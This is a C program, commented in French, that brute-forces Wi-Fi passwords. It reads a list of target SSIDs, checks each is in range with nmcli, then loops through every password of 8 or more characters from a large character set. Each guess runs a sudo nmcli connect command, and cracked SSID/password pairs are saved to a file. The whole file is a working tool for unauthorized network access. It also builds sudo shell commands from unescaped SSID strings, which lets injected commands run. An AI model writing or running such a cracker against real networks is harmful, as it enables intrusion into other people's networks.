#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdbool.h>
#include <unistd.h>
#include <ctype.h> // Pour la fonction isspace

#define MAX_PASSWORD_LENGTH 30

typedef struct {
    const char **data;
    size_t size;
} StringList;

// Fonction pour supprimer les espaces en début et fin de chaîne
void strtrim(char *str) {
    size_t len = strlen(str);
    while (len > 0 && isspace((unsigned char)str[len - 1])) {
        str[--len] = '\0';
    }
    size_t start = 0;
    while (isspace((unsigned char)str[start])) {
        start++;
    }
    if (start > 0) {
        memmove(str, str + start, len - start + 1);
    }
}

StringList listOfEssids() {
    FILE *file = fopen("../networkWithoutPasswords.txt", "r");
    if (file == NULL) {
        perror("Erreur lors de l'ouverture du fichier networkWithoutPasswords.txt");
        exit(1);
    }

    StringList essids = {0};
    char line[256];
    while (fgets(line, sizeof(line), file)) {
        if (line[0] != '\0' && line[0] != '\n') {
            line[strlen(line) - 1] = '\0';  // Remove newline character
            essids.data = realloc(essids.data, sizeof(char *) * (essids.size + 1));
            essids.data[essids.size] = strdup(line);
            essids.size++;
        }
    }
    fclose(file);
    printf("Found %zu essids\n", essids.size);
    for (size_t i = 0; i < essids.size; i++) {
        printf("%s\n", essids.data[i]);
    }
    return essids;
}

void saveSuccessfulConnection(const char *ssid, const char *password) {
    FILE *file = fopen("../successful_connections.txt", "a");
    if (file == NULL) {
        perror("Erreur lors de l'ouverture du fichier successful_connections.txt");
        exit(1);
    }
    
    fprintf(file, "SSID: %s, Password: %s\n", ssid, password);
    fclose(file);
}

int characters_find_index(const char *characters, char c) {
    int i;
    for (i = 0; characters[i] != '\0'; i++) {
        if (characters[i] == c) {
            return i;
        }
    }
    return -1;
}

void freeStringList(StringList *list) {
    for (size_t i = 0; i < list->size; i++) {
        free((void *)list->data[i]);
    }
    free(list->data);
}

bool increment_combination(char *combo, const char *characters) {
    int len = strlen(combo);
    int max_index = strlen(characters) - 1;
    int i;
    for (i = len - 1; i >= 0; i--) {
        if (combo[i] == characters[max_index]) {
            combo[i] = characters[0];
        } else {
            combo[i] = characters[characters_find_index(characters, combo[i]) + 1];
            return true;
        }
    }
    return false;
}

int main() {
    const char *possible_characters = "abcdefghijklmnopqrstuvwxyz0123456789@$+?.;:_=&#!-/*ABCDEFGHIJKLMNOPQRSTUVWXYZ";
    const int min_password_length = 8;
    const int max_password_length = MAX_PASSWORD_LENGTH;

    StringList essids = listOfEssids();
    for (size_t essid_idx = 0; essid_idx < essids.size; essid_idx++) {
        const char *original_ssid = essids.data[essid_idx];
        char trimmed_ssid[strlen(original_ssid) + 1];
        strcpy(trimmed_ssid, original_ssid); // Copie du SSID

        strtrim(trimmed_ssid); // Supprimer les espaces indésirables

        // Exécuter une recherche de réseaux Wi-Fi
        char search_command[256];
        snprintf(search_command, sizeof(search_command), "sudo nmcli device wifi list | grep -w '%s'", trimmed_ssid);
        int search_ret = system(search_command);
        if (search_ret != 0) {
            printf("No network found with SSID: %s\n", trimmed_ssid);
            continue; // Passer au prochain SSID
        }

        char combo[max_password_length + 1];
        memset(combo, '\0', sizeof(combo));
        for (int j = 0; j < min_password_length; j++) {
            combo[j] = possible_characters[0];
        }

        do {
            char connect_command[256];
            snprintf(connect_command, sizeof(connect_command), "sudo nmcli device wifi connect '%s' password '%s'", trimmed_ssid, combo);
            int ret = system(connect_command);
            if (ret == 0) {
                printf("Connected to SSID: %s, Password: %s\n", trimmed_ssid, combo);
                saveSuccessfulConnection(trimmed_ssid, combo);
                break; // Exit the loop once connected
            }
        } while (increment_combination(combo, possible_characters) && strlen(combo) <= max_password_length);
    }

    freeStringList(&essids);

    return 0;
}
